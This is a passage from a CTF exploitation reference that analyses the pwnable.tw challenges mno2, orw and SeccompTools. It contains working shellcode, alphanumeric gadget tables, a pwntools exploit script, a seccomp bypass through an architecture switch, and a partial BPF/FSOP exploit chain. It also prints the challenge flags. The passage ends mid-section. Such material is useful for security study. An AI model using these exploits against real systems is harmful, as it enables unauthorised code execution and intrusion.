EAX = 0x324F6E4D  (buffer address, also shellcode entry point)
EBX = 0x00000000
ECX = 0x00000000  (or ptr to element table, varies by libc)
EDX = 0x080489cc  (or similar code pointer)
ESI = libc GOT    (e.g. 0xf7faf000)
EDI = libc GOT    (same as ESI)
```

#### Vulnerability

##### V1 — Direct Shellcode Execution on RWX Page (Constrained)

**Root Cause:** `main()` mmaps a fixed RWX region, reads user input into it, validates the formula, then jumps to it. There is no W^X enforcement on the mmap'd buffer — if you pass the chemical formula validator, your input runs as native x86 code.

**Constraint:** Every byte must be alphanumeric (`[0-9A-Za-z]`) AND must parse as a valid sequence of element symbols from the periodic table (H, He, Li, Be, B, C, N, O, F, Ne, Na, ..., Lv) with optional trailing digits.

This means the usable instruction set is severely restricted to what alphanumeric bytes encode in x86:

#### Key Offsets

```python
BUF         = 0x324F6E4D   # Fixed mmap'd RWX buffer (= "MnO2" in LE)
mmap_base   = 0x324F6000   # mmap hint address
scanf_plt   = 0x08048420   # (binary-specific)
element_tbl = 0x08048890   # Periodic table strings in .rodata
```

### Exploit Paths

#### Usable Instruction Set

##### Single-byte Elements (direct x86 opcodes)

| Element | Hex | x86 Instruction |
|---------|-----|-----------------|
| `H` | `0x48` | `dec eax` |
| `B` | `0x42` | `inc edx` |
| `C` | `0x43` | `inc ebx` |
| `N` | `0x4E` | `dec esi` |
| `O` | `0x4F` | `dec edi` |
| `F` | `0x46` | `inc esi` |
| `P` | `0x50` | `push eax` |
| `S` | `0x53` | `push ebx` |
| `K` | `0x4B` | `dec ebx` |
| `V` | `0x56` | `push esi` |
| `W` | `0x57` | `push edi` |
| `U` | `0x55` | `push ebp` |
| `Y` | `0x59` | `pop ecx` |
| `I` | `0x49` | `dec ecx` |

##### Two-byte Elements (multi-byte gadgets)

| Element | Bytes | Effect |
|---------|-------|--------|
| `Xe` | `0x58 0x65` | `pop eax; gs` (prefix) |
| `Na` | `0x4E 0x61` | `dec esi; popad` |
| `Ba` | `0x42 0x61` | `inc edx; popad` |
| `Ca` | `0x43 0x61` | `inc ebx; popad` |
| `Bh` | `0x42 0x68` | `inc edx; push imm32` |
| `Th` | `0x54 0x68` | `push esp; push imm32` |
| `Rh` | `0x52 0x68` | `push edx; push imm32` |
| `Re` | `0x52 0x65` | `push edx; gs` (prefix) |
| `Zr` | `0x5A 0x72` | `pop edx; jb` (short jump, often falls through) |
| `Ar` | `0x41 0x72` | `inc ecx; jb` (short jump) |
| `Ag` | `0x41 0x67` | `inc ecx; addr16` (prefix) |

##### Digit-pair Gadgets (number suffixes that form instructions)

| Digits | Bytes | x86 Instruction |
|--------|-------|-----------------|
| `10` | `0x31 0x30` | `xor [eax], esi` |
| `11` | `0x31 0x31` | `xor [ecx], esi` |
| `12` | `0x31 0x32` | `xor [edx], esi` |
| `01` | `0x30 0x31` | `xor [ecx], dh` |
| `30` | `0x33 0x30` | `xor esi, [eax]` |
| `32` | `0x33 0x32` | `xor esi, [edx]` |
| `41`–`49` | `0x34 0x3N` | `xor al, imm8` |
| `50000` | `0x35 ...` | `xor eax, imm32` |

#### Exploit Paths

All solutions must produce shellcode that passes the chemical formula validator. Since `int 0x80` (`\xcd\x80`) and `/bin/sh` are not alphanumeric, every approach uses **self-modifying code** or a **two-stage strategy**. The solutions fall into several categories:

---

##### Path A — Two-Stage: Alphanumeric `read()` Stub → Unconstrained Stage 2 (Most Common)

**Used by:** Solutions 59, 378, 799, 1074, 1155, 1236, 1303, 1395, 2972, 3480, 3578, 7641, 8410, 15989, 21490, 31599, and exp.py

**Concept:** Stage 1 (the formula) is a self-modifying decoder that:
1. Patches `int 0x80` (`\xcd\x80`) into itself at a known offset using XOR operations
2. Sets up registers for `read(0, buf, big_count)` — `eax=3, ebx=0, ecx=buf, edx=large`
3. Falls through a NOP sled (e.g., `N` = `dec esi`, `O` = `dec edi`, `B` = `inc edx`) to the patched `int 0x80`
4. Stage 2 (unconstrained binary) is read in, overwriting the buffer, then executes standard `execve("/bin/sh")` shellcode

**Key Techniques for Patching `int 0x80`:**

- **XOR with ESI/EDI:** Zero out ESI via `popad` or self-XOR, then build the target value. Use `xor [ecx], esi` (digit `11`) or `xor [eax], esi` (digit `10`) to write arbitrary bytes.
- **XOR with DH:** Use `xor [ecx], dh` (digit `01`) for byte-level writes after loading DH via `push`/`pop` sequences.
- **XOR with AL:** Use `xor al, imm8` (digit `4N`) combined with `xor [ecx+offset], al` to patch memory.
- **Placeholder bytes:** Place `2O` (= `0x32 0x4F`) at a known offset, then XOR it with the right value to produce `0xCD 0x80`.

**Setting EAX=3 (SYS_read):**
- `5MnO2` = `xor eax, 0x324F6E4D` → zeroes EAX (since EAX already holds `0x324F6E4D`)
- Then `xor al, 0x31; xor al, 0x32` → `al = 3`
- Or: push 3 via `inc ebx*3; push ebx; pop eax; Xe; dec ebx*3`

**Setting EBX=0 (fd=stdin):**
- `popad` (`Na`, `Ba`, `Ca`) pops 8 registers from stack; pre-push zeroes to get `ebx=0`
- Or EBX is already 0 at entry

**Setting ECX (buffer address):**
- `push eax; pop ecx` (`PY`) since EAX = buffer address

**Stage 2:** Standard NOP sled + `execve("/bin/sh")`:
```nasm
xor eax, eax
push eax
push 0x68732f2f  ; "//sh"
push 0x6e69622f  ; "/bin"
mov ebx, esp
push eax
push ebx
mov ecx, esp
cdq               ; edx = 0
mov al, 0xb
int 0x80
```

**Example minimal formula (solution 1155):**
```
PYKSXe4N410AcISXe420AcCCCCSXeKKKBBBBBBAu9
```

---

##### Path B — Single-Stage: Write Entire `execve` In-Place via XOR Loops

**Used by:** Solutions 786, 2233, 8153

**Concept:** Instead of calling `read()`, patch the **entire** `execve("/bin/sh")` shellcode byte-by-byte into memory using XOR gadgets. This avoids needing a second `send()`.

**Technique:** For each shellcode byte:
1. `inc esi` (`F`) the required number of times to set ESI to the target byte
2. `xor [ecx], esi` (`11`) to write it
3. `dec esi` (`N`) to reset, `inc ecx` (`Ar`) to advance

Solution 786 literally does `inc esi * ord(c); xor; dec esi * ord(c); xor; inc ecx` for each byte of the shellcode. This produces an enormous payload but works in a single stage.

Solution 8153 is similar, using a detailed byte-by-byte approach to construct `/bin/sh` in ESI/EDI registers via triple-XOR patterns, construct `int 0x80` via memory XOR, then set up `popad` to load all registers and execute the syscall.

**Downside:** Payloads can be thousands of bytes long (up to ~31337, the stated limit).

---

##### Path C — Build ROP Chain + `ret` via Self-Modification

**Used by:** Solutions 408, 823

**Concept:** Instead of directly executing shellcode, construct a `ret` instruction (`0xC3`) via XOR at the end of the formula. Meanwhile, push a ROP chain (or a `scanf` call) onto the stack. When execution reaches the patched `ret`, it returns into the ROP chain.

**Solution 408 specifics:**
1. Use `popad` to load controlled values into registers
2. Compute `scanf`'s PLT address via `dec eax` + `xor eax, imm32` sequences
3. Push `scanf(format="%s", buf=rwx_addr)` frame onto the stack
4. Patch a `ret` (`0xC3 = 0x46 ^ 0x85`) by XOR-writing to the end of the payload
5. `ret` → `scanf` reads unconstrained stage 2 → `execve`

**Solution 823 specifics:**
1. Use the GOT address (already in EDI at entry) as a base
2. `dec ebx` + `xor [edx], bl` in a loop to subtract from the GOT pointer until it points to a one-gadget in libc
3. Patch `ret` via XOR with ESI, push the computed one-gadget address, and `ret` into it

---

##### Path D — Forge `int 0x80` + Build `/bin/sh` Entirely In Registers

**Used by:** Solution 8153 (the 2-day marathon solution), 2233

**Concept:** Never call `read()` or `scanf`. Instead, construct the entire `execve("/bin/sh", argv, NULL)` syscall using only formula-valid instructions:
1. Build `/bin/sh\0` in memory via XOR chains (using ESI/EDI to hold partial values, XOR to stack-pushed constants, then write via `xor [addr], reg`)
2. Set EBX → pointer to `/bin/sh`, ECX=0, EDX=0, EAX=0xb
3. Construct `int 0x80` at a known address using the same XOR technique
4. Fall through or jump to it

This is the hardest and most tedious path but requires only a single payload.

#### Exploit Primitive Summary

| Primitive | Technique | Notes |
|-----------|-----------|-------|
| Zero EAX | `5MnO2` (xor eax, 0x324f6e4d) | EAX already holds this value |
| Zero ESI/EDI | `popad` with pushed zeroes | Or XOR with memory: `30` = `xor esi, [eax]` |
| Zero EBX | Already 0 at entry, or `popad` | |
| Set EAX=3 | XOR sequences: `41` `42` etc. | `xor al, 0x31; xor al, 0x32` = 3 |
| Set ECX=buf | `PY` (push eax; pop ecx) | EAX = buf at entry |
| Write arbitrary byte | XOR: `inc esi*N; xor [ecx],esi; dec esi*N` | Slow but universal |
| Push imm32 | `Bh`, `Th`, `Rh` + 4 alphanum bytes | Element prefix + 4 bytes |
| Patch `int 0x80` | XOR `0x324F` or `0x3131` → `0xCD80` | Various XOR key combos |
| NOP sled | `N` (dec esi), `O` (dec edi), `B` (inc edx), `F` (inc esi) | Harmless single-byte elements |
| `popad` | `Na`, `Ba`, `Ca` | Load 8 registers from stack |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `59.md` | A | XOR-patch `int 0x80` via `[ecx+0x73]`; `push/pop` for eax=3 | Annotated ASM for each compound |
| `378.md` | A | Compact formula; XOR to build `int 0x80` | Short payload |
| `408.md` | C | Build ROP for `scanf()`; patch `ret` via XOR | Elegant stack-pivot approach |
| `751.md` | B | Perl one-liner; `dec eax` + `xor [eax],esi` byte writer | Bash-only, no Python |
| `755.md` | D | Massive XOR chains to build `/bin/sh` and `int 0x80` in-place | 2048+ byte single-stage |
| `786.md` | B | `inc esi*N; xor; dec esi*N` per byte of execve | Brute-force byte-by-byte |
| `799.md` | A | `popad` zeroing + `xor` to patch; clean minimal | |
| `823.md` | C | GOT-relative one_gadget; spray `dec ebx` + XOR loop | libc-dependent |
| `1074.md` | A | Self-modify; patch `int 0x80` and `/bin/sh` | Compact |
| `1155.md` | A | Minimal: XOR [eax+0x65] to patch; `call read` in 43 bytes | Shortest known formula |
| `1236.md` | A | `popad` + XOR via `Rh` pushes | Clean register setup |
| `1303.md` | A | `Rh` push + `xor [eax],dh` for patching | |
| `1395.md` | A | `5MnO2` to zero EAX; `popad` for register setup | Minimal and clean |
| `2121.md` | A | XOR `[eax+0x65]` with ecx; push/pop for eax=3 | |
| `2233.md` | A | `xor dword ptr [eax+0x50],edx` + xor chain | Uses `[eax+imm]` indexing |
| `2972.md` | A | `inc ecx` via `At0`; `xor [esi+0x34], ecx` byte writer | Long but methodical |
| `3480.md` | A | Compact: `5MnO2` zero + `Ag` inc_ecx | |
| `3578.md` | A | `xor [ecx+ebp*2+offset]` indexed writes | Uses EBP as index |
| `6247.md` | A | `pop edx` via `Zr`; `push val` via `Bh` | |
| `7641.md` | A | `xor [eax+0x65], al` + `Hf` prefix writes | |
| `8153.md` | D | Full single-stage: build `/bin/sh` in ESI/EDI, forge `int 0x80` | 2-day effort; 370+ lines |
| `8410.md` | A | `xor [eax+0x65],ecx` with `Th` pushes | |
| `15989.md` | A | `Si2` xor gadgets; padding with `O` NOPs | |
| `21490.md` | A | `xor esi,[eax]` then `xor [ecx],esi` chain | Full ASM gadget table |
| `31599.md` | A | `1He` xor + `Ag` inc_ecx + `ThK111` push | Compact with XOR tricks |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working two-stage exploit (formula → `read()` → `execve`) |
| `desc.txt` | Challenge description |
| `artifacts/mno2` | Original challenge binary (i386, stripped) |
| `solution/*.md` | Community write-ups (72 solutions) |

## orw
> **Canonical route:** Seccomp-filtered RWX shellcode execution → open/read/write shellcode; x64 `retf` architecture switch can enable `execve`
> **Read this case when:** RWX BSS shellcode runs under an ORW-only seccomp filter.
> **Primary defect:** Seccomp-filtered RWX shellcode execution
> **Exploit primitive/result:** open/read/write shellcode; x64 `retf` architecture switch can enable `execve`
> **Search terms:** ORW; seccomp BPF; RWX BSS; `0x804a060`; `retf`; CS `0x33`
> **Version/protection clue:** Case target `orw` — i386, static, Partial RELRO, canary, NX disabled/RWX BSS, no PIE
> **Variant boundary:** Standalone; intended filter blocks `execve`, so x64 `retf` is the documented bypass.

### Metadata
- Source title: orw — pwnable.tw (100 pts)

```yaml
tags:
  - shellcode
  - seccomp-bypass
platform: pwnable.tw
points: 100
arch: i386
libc: static
relro: partial
canary: yes
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A fixed RWX BSS buffer executes user shellcode restricted by a seccomp filter to open, read, and write syscalls to read the flag file."
proof-of-concept: no
```

# orw — pwnable.tw (100 pts)

> `nc chall.pwnable.tw 10001`
>
> Flag: `FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}`

### Facts

#### Challenge Overview

A minimal i386 shellcode challenge. The binary reads up to 0xc8 (200) bytes of user input into a fixed BSS buffer at `0x804a060`, then jumps to it. Before execution, a seccomp BPF filter is installed via `prctl` that restricts syscalls to only `open`, `read`, `write` (plus `exit`, `exit_group`, `sigreturn`, `rt_sigreturn`). The goal is to read `/home/orw/flag` using only those three syscalls.

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX disabled         # writable + executable BSS
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments
```

#### Binary Analysis

##### `main` Disassembly

```asm
08048548 <main>:
 8048559:  call   80484cb <orw_seccomp>     ; install seccomp filter
 8048561:  push   0x80486a0                 ; "Give my your shellcode:"
 8048566:  call   8048380 <printf@plt>
 8048571:  push   0xc8                      ; count = 200 bytes
 8048576:  push   0x804a060                 ; buf = BSS buffer
 804857b:  push   0x0                       ; fd = stdin
 804857d:  call   8048370 <read@plt>        ; read(0, 0x804a060, 0xc8)
 8048585:  mov    eax, 0x804a060
 804858a:  call   *eax                      ; execute shellcode
```

##### Seccomp Filter (BPF rules)

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011   # NOTE: non-i386 → ALLOW
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)       # deny
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

**Allowed i386 syscalls:** `open` (5), `read` (3), `write` (4), `exit` (1), `exit_group` (252), `sigreturn` (119), `rt_sigreturn` (173).

**Seccomp bug:** The architecture check at line 0001 jumps to ALLOW for non-i386 architectures. This means switching to x86-64 mode via `retf` to CS=0x33 bypasses all restrictions, allowing `execve("/bin/sh")`.

#### Vulnerability

##### V1 — Arbitrary Shellcode Execution (Primary)

**Root Cause:** The program reads user-supplied shellcode into an RWX BSS buffer and calls it directly with `call *eax`. No validation of the input beyond the seccomp filter.

```c
// Pseudocode of main
void main() {
    orw_seccomp();                         // install BPF filter
    printf("Give my your shellcode:");
    read(0, (void *)0x804a060, 0xc8);      // read up to 200 bytes
    ((void(*)())0x804a060)();              // execute as code
}
```

**Impact:** Full shellcode execution, constrained only by seccomp to `open`/`read`/`write` syscalls (on i386).

##### V2 — Seccomp Architecture Check Bug (Bonus)

**Root Cause:** The BPF filter checks `if (arch != ARCH_I386) goto ALLOW`. Non-i386 syscalls are **allowed**, not denied. On an x86-64 kernel running a 32-bit binary, a `retf` to segment selector `0x33` switches the CPU to 64-bit long mode, where all syscalls (including `execve`) pass the filter.

```asm
; Switch from 32-bit to 64-bit mode
mov dword [esp+4], 0x33   ; CS selector for 64-bit
retf                       ; far return → now in amd64 mode
; 64-bit execve("/bin/sh") shellcode follows
```

**Impact:** Full shell via `execve`, completely bypassing the intended open/read/write restriction.

### Exploit Paths

#### Exploit Paths

##### Path A — open/read/write Shellcode (Intended, Standard)

**Used by:** ~95% of all 302 solutions

The canonical approach: write i386 shellcode that chains `open("/home/orw/flag")` → `read(fd, buf, len)` → `write(1, buf, len)`.

**Shellcode logic (C equivalent):**
```c
int fd = open("/home/orw/flag", O_RDONLY, 0);   // syscall 5
read(fd, buf, 0x30);                             // syscall 3
write(1, buf, 0x30);                             // syscall 4
```

**Typical hand-written assembly (i386, ~50-70 bytes):**
```asm
; === open("/home/orw/flag", O_RDONLY, 0) ===
xor  eax, eax
xor  ecx, ecx
push eax                    ; NUL terminator
push 0x67616c66             ; "flag"
push 0x2f77726f             ; "orw/"
push 0x2f656d6f             ; "ome/"
push 0x682f2f2f             ; "///h"  (extra / padding for alignment)
mov  ebx, esp               ; ebx = pointer to path on stack
xor  edx, edx
mov  al, 5                  ; SYS_open
int  0x80                   ; fd returned in eax

; === read(fd, esp, 0x40) ===
mov  ebx, eax               ; ebx = fd
mov  ecx, esp               ; ecx = buffer (reuse stack)
mov  dl, 0x40               ; edx = count
xor  eax, eax
mov  al, 3                  ; SYS_read
int  0x80

; === write(1, esp, 0x40) ===
mov  edx, eax               ; edx = bytes read
xor  ebx, ebx
mov  bl, 1                  ; ebx = stdout
mov  al, 4                  ; SYS_write
int  0x80
```

**Variations across solutions:**

| Variant | Description |
|---------|-------------|
| **Stack string** | Push path as dwords onto stack (most common) |
| **Embedded string** | `call`/`pop` or `jmp`/`call`/`pop` to get address of inline string |
| **Hardcoded BSS address** | Read file contents into a known BSS address (e.g., `0x804a040`, `0x804a100`) instead of stack |
| **Two-stage read** | First shellcode does `read(0, writable, N)` to receive the path string, then `open`/`read`/`write` |
| **pwntools shellcraft** | `shellcraft.open() + shellcraft.read() + shellcraft.write()` or `shellcraft.cat2()` |
| **Byte-at-a-time** | Read and write one byte at a time in a loop (shell-storm.org shellcode-73) |
| **Hardcoded fd=3** | Assume `open` returns fd 3 (since 0/1/2 are stdin/stdout/stderr) |

**Buffer choice for `read`:**
- **Stack (`esp`)** — most common, no address needed
- **BSS (`0x804a040`+)** — static address, no PIE, safe
- **Shellcode buffer itself (`0x804a060`+)** — RWX, works if shellcode is short enough

---

##### Path B — Architecture Switch to x86-64 → `execve("/bin/sh")` (Seccomp Bypass)

**Used by:** Solutions 1225, 1727, and a few others

Exploits the seccomp filter bug where non-i386 architectures are allowed. Uses `retf` with CS=0x33 to switch the CPU from 32-bit compatibility mode to 64-bit long mode, then executes standard amd64 `execve("/bin/sh")` shellcode.

```asm
; Stage 1: switch to 64-bit mode
jmp  setup
to64:
    mov  dword [esp+4], 0x33    ; CS selector for long mode
    retf                         ; far return → 64-bit mode
setup:
    call to64

; Stage 2: standard amd64 execve("/bin/sh")
xor    eax, eax
mov    rbx, 0xff978cd091969dd1  ; NOT("/bin/sh\0")
not    rbx
push   rbx
push   rsp
pop    rdi
cdq
push   rdx
push   rdi
push   rsp
pop    rsi
mov    al, 0x3b                 ; SYS_execve (amd64)
syscall
```

**Impact:** Full interactive shell, not just flag read. Completely bypasses the intended ORW restriction.

**Reliability:** 100% — no randomness involved. However, requires the remote kernel to support 64-bit mode (which it does, as it's a 64-bit host running 32-bit binaries).

---

##### Path C — pwntools One-Liner (Convenience)

**Used by:** Many solutions

Leverages pwntools' `shellcraft` module to auto-generate the shellcode:

```python
from pwn import *
context(arch='i386', os='linux')
p = remote("chall.pwnable.tw", 10001)
shellcode = asm(
    shellcraft.open("/home/orw/flag") +
    shellcraft.read("eax", "esp", 50) +
    shellcraft.write(1, "esp", 50)
)
p.sendlineafter(":", shellcode)
print(p.recv())
```

Or even shorter with `shellcraft.cat2()`:
```python
shellcode = shellcraft.cat2("/home/orw/flag")
```

#### Key Technical Details

##### Syscall Numbers (i386 `int 0x80`)

| Syscall | Number | Registers |
|---------|--------|-----------|
| `open`  | 5      | ebx=path, ecx=flags, edx=mode |
| `read`  | 3      | ebx=fd, ecx=buf, edx=count |
| `write` | 4      | ebx=fd, ecx=buf, edx=count |
| `exit`  | 1      | ebx=status |

##### String Encoding for `/home/orw/flag`

The path must be pushed onto the stack as 32-bit dwords in reverse order, with padding for 4-byte alignment:

```
"/home/orw/flag\x00" (15 bytes) → pad to 16 with extra '/'

"///home/orw/flag\x00" pushed as:
  push 0x00000000     ; NUL terminator (or xor eax,eax; push eax)
  push 0x67616c66     ; "flag"
  push 0x2f77726f     ; "orw/"
  push 0x2f656d6f     ; "ome/"
  push 0x682f2f2f     ; "///h"
```

Some solutions avoid the NUL push by using `0x00006761` for the last dword (with high bytes being zero), or use `call`/`pop` to reference an inline string.

##### Memory Layout

| Address | Content |
|---------|---------|
| `0x804a060` | Shellcode buffer (BSS, RWX, 200 bytes max) |
| `0x804a040` | Start of `.bss` section |
| `0x804a000` | `.got.plt` |

### Assets and Provenance

#### Solution Write-ups

| File | Approach | Key Technique | Notes |
|------|----------|---------------|-------|
| `100.md` | A | Byte-at-a-time loop from shell-storm.org | Classic shellcode-73 |
| `117.md` | A | Hand-crafted shellcode with XOR-encoded path | Pushes path with XOR trick to avoid NUL |
| `1001.md` | A (pwntools) | `shellcraft.open` + `shellcraft.read` + `shellcraft.write` | Cleanest pwntools approach |
| `1039.md` | A | NASM assembly, standalone `.asm` file | Uses `xchg` tricks for compact code |
| `1045.md` | A (pwntools) | `shellcraft.open` + `shellcraft.read(3, 'esp', 50)` | Hardcodes fd=3 |
| `1151.md` | A (pwntools) | `shellcraft.pushstr` + `shellcraft.syscall` | Uses BSS `0x804a800` as read buffer |
| `1169.md` | A | Compact hand-crafted, 41 bytes | Uses `xchg`/`mul` tricks for minimal size |
| `1225.md` | **B** | **x86-64 arch switch via `retf` to CS=0x33** | Full shell bypass of seccomp filter |
| `1266.md` | A | Hardcoded BSS addresses for path and buffer | References `0x804a095` and `0x804a220` |
| `1297.md` | A | Stack-push path, `xchg` for register shuffling | Clean 32-bit int 0x80 |
| `1316.md` | A | Go language exploit client | Sends raw shellcode bytes via Go net.Dial |
| `1754.md` | A | Detailed learning log with GDB debugging | Shows full development process |
| `10068.md` | A | NASM standalone + Python sender | Clean separation of asm and exploit |
| `10115.md` | A | Hardcoded BSS buffer `0x804a140` | Uses `mov` instead of `push`/`pop` |
| `10840.md` | A | Two-stage: `read` path string, then ORW | Sends path as second payload |
| `11543.md` | A | Intel syntax `.s` file + shell pipeline | `as --32` + `objcopy` + `nc` |
| `12928.md` | A | NASM with `call`/`pop` for inline string | Classic `jmp`-`call`-`pop` pattern |
| `14121.md` | A | Detailed Chinese writeup with seccomp analysis | Uses `seccomp-tools`, explains BSS layout |
| `18160.md` | A | Seccomp analysis + pwntools `shellcraft.cat2` | One-liner convenience approach |
| `18582.md` | A | NASM + Python, detailed step-by-step | Good pedagogical writeup |
| `20313.md` | A | Chinese writeup with full assembly explanation | Explains fd=3 assumption, stack balance |
| `28834.md` | A | `shellcraft.cat2("/home/orw/flag")` | Shortest pwntools approach |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (raw socket, `call`/`pop` shellcode) |
| `desc.txt` | Challenge description |
| `artifacts/orw` | Original challenge binary (i386, stripped) |
| `solution/*.md` | Community write-ups (302 solutions) |

## seccomptools
> **Canonical route:** `BPF_LD\|BPF_LEN` emulator/kernel differential plus `fread` FILE-pointer overflow → Seccomp oracle, fake FILE, setcontext ORW, mprotect shellcode, or two-stage FSOP
> **Read this case when:** A BPF/seccomp editor emulates rules differently from the kernel and can overflow a FILE pointer.
> **Primary defect:** `BPF_LD\|BPF_LEN` emulator/kernel differential plus `fread` FILE-pointer overflow
> **Exploit primitive/result:** Seccomp oracle, fake FILE, setcontext ORW, mprotect shellcode, or two-stage FSOP
> **Search terms:** seccomp; BPF; `BPF_LEN`; emulator differential; `SECCOMP_RET_ERRNO`; fake FILE; oracle
> **Version/protection clue:** Case target `seccomptools` — x86-64, glibc 2.23, Full RELRO, canary/NX/PIE
> **Variant boundary:** Standalone; route by policy differential and FILE overflow together, not generic seccomp ORW.

### Metadata
- Source title: SeccompTools — pwnable.tw (500 pts)

```yaml
tags:
  - arbitrary-write
  - seccomp-bypass
  - timing-side-channel
platform: pwnable.tw
points: 500
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A heap write primitive in seccomp rule management permits overwriting __free_hook to trigger a BPF filter oracle disclosing memory contents."
proof-of-concept: no
```

# SeccompTools — pwnable.tw (500 pts)

> `nc chall.pwnable.tw 10408`
>
> Flag: `FLAG{u_r_master_of_secooooooomp!}`

### Facts

#### Challenge Overview

Target: a seccomp BPF rule editor/emulator on x86-64 with PIE, Full RELRO, NX, and Stack Canary, built against glibc 2.23. The program lets users create custom BPF (Berkeley Packet Filter) seccomp rules, disassemble them, emulate them, and install them into the kernel. It loads example rules from files via `fopen`/`fread` and validates that rules "allow ORW" before installing them. After loading an example, the `FILE *stream` pointer is stored in BSS and later `fclose`'d.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

#### Vulnerabilities

##### V1 — BPF_LEN Emulator/Kernel Differential (Primary, Exploitable)

**Root Cause:** The program's BPF emulator does **not** implement the `BPF_LD | BPF_LEN` instruction (opcode `0x80`). In the emulator, `A` remains 0 after this instruction. In the real Linux kernel seccomp, `BPF_LEN` loads `sizeof(struct seccomp_data)` = **64** into `A`.

```
Emulator:  BPF_LEN → A = 0  (unimplemented, A unchanged)
Kernel:    BPF_LEN → A = 64 (sizeof(struct seccomp_data))
```

This creates a **parser differential**: a rule can be crafted that passes the emulator's ORW validation check but installs a completely different policy in the kernel.

```python
# Bypass the ORW check:
BPF_STMT(BPF_LD | BPF_LEN, 0)          # emulator: A=0, kernel: A=64
BPF_JUMP(BPF_JEQ, 64, bypass_to_real, 0)  # emulator: false→allow, kernel: true→real_filter
BPF_STMT(BPF_RET, SECCOMP_RET_ALLOW)    # emulator always reaches here
# ... actual malicious filter follows (kernel only) ...
```

**Impact:** Allows installing arbitrary seccomp filters that the ORW validation doesn't see.

##### V2 — SECCOMP_RET_ERRNO Makes `open()` Return 0 (Exploitable)

**Root Cause:** When a seccomp filter returns `SECCOMP_RET_ERRNO(0)` for the `open` syscall, the kernel skips the syscall and returns 0 (no error). Since fd 0 = stdin, `fopen()` receives a `FILE *` backed by fd 0 (stdin). Subsequent `fread()` from this stream reads user input instead of a file.

```c
// In the binary, loading an example rule:
stream = fopen("allow_orw.bpf", "rb");   // open() → blocked by seccomp → returns 0 (stdin)
fread(filter_buf, 1, filter_size, stream); // reads from stdin!
// filter_size comes from the first 2 bytes of the "file" (user-controlled)
```

**Impact:** The user controls `filter_size` (up to 0xffff) via the first 2 bytes sent, while `filter_buf` is at a fixed BSS offset (`0x203080`). Sending size `0x1008` overflows past the 0x1000-byte `filter_buf` and overwrites the adjacent `stream` pointer at `filter_buf + 0x1000`.

##### V3 — BSS `stream` Pointer Overwrite → FSOP (Exploitable)

**Root Cause:** The `FILE *stream` pointer lives 0x1000 bytes after `filter_buf` in BSS. By overflowing via V2, the attacker replaces `stream` with a pointer to a forged `_IO_FILE_plus` structure in the same buffer. When the program calls `fclose(stream)`, it follows the fake vtable to attacker-controlled code.

```c
// After fread overflow:
// filter_buf[0x1000] now contains &fake_FILE (points back into filter_buf)
fclose(stream);  // → calls fake_vtable->__finish(fake_FILE)
```

**Impact:** Full control of RIP when `fclose` dispatches through the fake vtable.

##### V4 — Seccomp Side-Channel Oracle for Address Leak (Exploitable)

**Root Cause:** BPF filters can inspect `seccomp_data` fields including `instruction_pointer` (libc code address of the syscall instruction) and syscall arguments (`args[0]`–`args[5]`, which include buffer addresses). By returning `SECCOMP_RET_ERRNO` when a specific bit is set and `SECCOMP_RET_ALLOW` otherwise, the attacker creates a side-channel oracle.

```
struct seccomp_data {
    int   nr;                  // offset 0x00: syscall number
    __u32 arch;                // offset 0x04
    __u64 instruction_pointer; // offset 0x08: libc address!
    __u64 args[6];             // offset 0x10: includes buffer addresses (PIE leak)
};
```

The oracle works by observing whether `fread` (which calls `read` internally) succeeds or blocks:
- If the filter returns `ERRNO` for a `read`, `fread` retries in a loop → the program appears to hang (no output).
- If the filter returns `ALLOW`, the `read` succeeds → the program prints "Done!".

**Impact:** Leaks PIE base (from `args[0]` = buffer address in `read`) and libc base (from `instruction_pointer` = address of `read` syscall) bit-by-bit or byte-by-byte.

#### `seccomp_data` Layout (for BPF Oracle)

```
struct seccomp_data {
    0x00: int   nr;                   // syscall number
    0x04: __u32 arch;                 // AUDIT_ARCH_X86_64 = 0xC000003E
    0x08: __u64 instruction_pointer;  // → libc address (where syscall insn lives)
    0x10: __u64 args[0];              // → filename ptr for open, buf ptr for read
    0x18: __u64 args[1];              // → buf ptr (PIE leak via fread→read)
    0x20: __u64 args[2];              // → size (controllable via fread loop)
    0x28: __u64 args[3];
    0x30: __u64 args[4];
    0x38: __u64 args[5];
};
// sizeof(seccomp_data) = 64 = 0x40
// BPF accesses 32-bit words: data[0x08]=ip_low, data[0x0c]=ip_high, etc.
```

### Exploit Paths

#### Exploit Flow (Universal Across All Solutions)

All 16 solutions follow the same three-phase structure:

##### Phase 1 — Leak Addresses via Seccomp Oracle

Install a BPF filter (bypassing the ORW check via V1) that uses the side-channel oracle (V4) to leak:
- **PIE base**: from `seccomp_data.args[0]` (the buffer address passed to `read`) or `seccomp_data.args[1]`
- **libc base**: from `seccomp_data.instruction_pointer` (the libc address where `read` syscall is executed)

##### Phase 2 — Overflow BSS via Forced stdin Read

